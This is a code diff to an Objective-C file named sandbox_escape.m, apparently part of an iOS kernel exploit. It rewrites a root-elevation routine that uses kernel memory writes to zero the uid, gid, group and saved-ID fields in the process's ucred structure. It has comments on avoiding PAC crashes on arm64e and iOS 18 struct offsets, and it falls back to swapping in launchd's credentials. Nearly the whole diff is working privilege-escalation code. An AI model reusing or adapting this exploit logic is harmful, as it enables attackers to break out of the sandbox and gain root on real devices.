@@ -1,4 +1,4 @@
-/*
+﻿/*
  * sandbox_escape.m — Sandbox escape via kernel memory patching
  *
  * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
@@ -272,17 +272,36 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     }
     NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
 
+    // PAC-SAFE: directly write uid/gid fields in ucred struct (NOT the pointer!)
+    // Writing the p_ucred pointer directly would crash on PAC-protected arm64e.
     uint64_t ourucredraw = early_kread64(self_proc + 0x10);
     uint64_t ourucred = S(ourucredraw);
-    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
+    NSLog(@"[SBX] elevate: ourucred: 0x%llx (PAC-stripped)", ourucred);
 
-    early_kwrite64(self_proc + 0x10, launchducred);
+    // ucred layout on iOS 18 arm64: ref(4) type(4) uid(4) gid(4) groups(16*4) ...
+    early_kwrite32(ourucred + 0x08, 0);  // cr_uid = 0
+    early_kwrite32(ourucred + 0x0C, 0);  // cr_gid = 0
+    for (int g = 0; g < 16; g++) {
+        early_kwrite32(ourucred + 0x10 + g * 4, 0);  // all groups = 0
+    }
+    // cr_ruid/cr_rgid/cr_suid follow groups
+    early_kwrite32(ourucred + 0x50, 0);   // cr_ruid = 0
+    early_kwrite32(ourucred + 0x54, 0);   // cr_rgid = 0
+    early_kwrite32(ourucred + 0x58, 0);   // cr_suid = 0
+    NSLog(@"[SBX] elevate: wrote uid/gid fields to ucred");
 
     if (getuid() == 0) {
-        NSLog(@"[SBX] elevate success!");
+        NSLog(@"[SBX] elevate SUCCESS! uid=%d", getuid());
         return 0;
     }
 
-    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
+    // Last resort: pointer swap (risky PAC)
+    NSLog(@"[SBX] uid still %d, trying pointer swap (PAC risk!)", getuid());
+    early_kwrite64(self_proc + 0x10, launchducred);
+    if (getuid() == 0) {
+        NSLog(@"[SBX] elevate SUCCESS via pointer swap!");
+        return 0;
+    }
+    NSLog(@"[SBX] elevate FAILED, uid=%d", getuid());
     return -1;
 }
